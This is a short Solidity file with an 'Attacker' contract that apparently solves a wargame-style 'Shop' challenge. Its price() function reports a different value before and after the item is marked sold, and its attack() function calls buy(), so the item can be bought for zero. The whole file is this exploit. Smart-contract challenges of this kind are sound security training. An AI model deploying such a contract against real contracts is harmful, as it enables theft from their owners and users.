// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.8.0;
import "./Contract.sol";

contract Attacker {
    Shop _shop = Shop(0x9546b20936E2207Cddf3C59448E1CDA5A2b52708);

    function price() external view returns (uint) {
        //if isSold value is false return 100, else return 0.
        if (!_shop.isSold()) {
            return 100;
        } else {
            return 0;
        }
    }

    function attack() public {
        _shop.buy();
    }
}
